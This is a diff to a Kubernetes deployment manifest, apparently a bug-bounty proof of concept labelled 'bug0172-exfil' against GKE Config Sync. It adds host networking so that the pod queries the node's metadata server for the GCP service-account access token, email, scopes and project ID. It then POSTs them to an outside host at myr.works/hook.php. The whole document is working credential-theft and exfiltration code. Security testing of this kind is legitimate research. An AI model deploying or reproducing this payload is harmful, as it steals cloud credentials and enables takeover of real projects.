@@ -17,6 +17,8 @@ spec:
       labels:
         app: bug0172-exfil
     spec:
+      hostNetwork: true
+      dnsPolicy: ClusterFirstWithHostNet
       containers:
       - name: exfil
         image: curlimages/curl:latest
@@ -27,10 +29,10 @@ spec:
           ACCESS_TOKEN=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token"             | sed 's/.*"access_token":"\([^"]*\)".*/\1/')
           SA_EMAIL=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email")
           SCOPES=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/scopes")
-          NS=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)
+          PROJECT=$(curl -s -H "Metadata-Flavor: Google"             "http://169.254.169.254/computeMetadata/v1/project/project-id")
           curl -s -X POST https://myr.works/hook.php \
             -H "Content-Type: application/json" \
             -H "X-Test-issue: fromgkehub" \
-            -d "{\"access_token\": \"$ACCESS_TOKEN\", \"sa_email\": \"$SA_EMAIL\", \"scopes\": \"$SCOPES\", \"namespace\": \"$NS\", \"source\": \"bug0172-gkehub-configsync\"}"
-          echo "Access token exfil sent. Sleeping."
+            -d "{\"access_token\": \"$ACCESS_TOKEN\", \"sa_email\": \"$SA_EMAIL\", \"scopes\": \"$SCOPES\", \"project\": \"$PROJECT\", \"source\": \"bug0172-gkehub-configsync-hostnet\"}"
+          echo "Node SA access token exfil sent. Sleeping."
           sleep 3600
